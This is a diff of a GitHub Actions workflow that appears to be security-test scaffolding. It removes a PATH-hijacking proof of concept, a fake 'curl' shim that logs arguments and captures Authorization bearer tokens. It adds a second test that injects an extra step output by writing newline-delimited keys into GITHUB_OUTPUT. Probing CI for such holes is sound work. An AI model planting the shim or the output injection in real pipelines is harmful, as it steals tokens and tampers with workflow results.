@@ -8,49 +8,29 @@ permissions:
 jobs:
   test:
     runs-on: ubuntu-latest
+    outputs:
+      normal: ${{ steps.inject.outputs.normal }}
+      injected: ${{ steps.inject.outputs.injected_key }}
     steps:
-      - name: Step 1 — create shadow binaries and add to PATH
+      - name: inject — write outputs with newline in key
+        id: inject
         run: |
-          mkdir -p /tmp/shadow-bin
+          # Normal output
+          echo "normal=NORMAL_VALUE" >> $GITHUB_OUTPUT
           
-          # Create a fake 'curl' that captures all arguments
-          cat > /tmp/shadow-bin/curl << 'SCRIPT'
-          #!/bin/bash
-          echo "SHADOW_CURL_CAPTURED: $@" >> /tmp/shadow_captures.txt
-          # Also capture any Authorization headers
-          for arg in "$@"; do
-            if echo "$arg" | grep -qi "bearer\|token\|auth"; then
-              echo "AUTH_HEADER: $arg" >> /tmp/shadow_captures.txt
-            fi
-          done
-          # Forward to real curl
-          /usr/bin/curl "$@"
-          SCRIPT
-          chmod +x /tmp/shadow-bin/curl
+          # Injected output: key contains newline to add extra output
+          # The prepareKeyValueMessage format is: KEY<<DELIM\nVALUE\nDELIM
+          # If KEY contains \n, it breaks the format
+          printf 'harmless<<EOF\nHARMLESS\nEOF\ninjected_key<<EOF2\nINJECTED_VIA_NEWLINE\nEOF2' >> $GITHUB_OUTPUT
           
-          # Add shadow directory to GITHUB_PATH (prepended to PATH)
-          echo "/tmp/shadow-bin" >> $GITHUB_PATH
-          echo "Step 1: Shadow bin created and added to GITHUB_PATH"
+          echo "Step 1: wrote outputs"
 
-      - name: Step 2 — use curl (should use shadow version)
-        env:
-          MY_TOKEN: ${{ github.token }}
+      - name: check — read the outputs
         run: |
-          echo "PATH=$PATH" | head -c 100
-          echo "..."
+          echo "=== GITHUB_OUTPUT contents ==="
+          cat $GITHUB_OUTPUT
           echo ""
-          echo "Which curl: $(which curl)"
-          echo ""
-          # This curl call should go through the shadow binary
-          curl -s -H "Authorization: Bearer $MY_TOKEN" https://api.github.com/user > /dev/null 2>&1
-          echo "Step 2: curl executed"
-
-      - name: Step 3 — check what was captured
-        run: |
-          echo "=== Shadow binary captures ==="
-          if [ -f /tmp/shadow_captures.txt ]; then
-            # Redact any tokens
-            cat /tmp/shadow_captures.txt | sed 's/ghs_[A-Za-z0-9]*/ghs_[SHADOW_CAPTURED]/g'
-          else
-            echo "No captures"
-          fi
+          echo "=== Step outputs ==="
+          echo "normal=${{ steps.inject.outputs.normal }}"
+          echo "injected_key=${{ steps.inject.outputs.injected_key }}"
+          echo "harmless=${{ steps.inject.outputs.harmless }}"
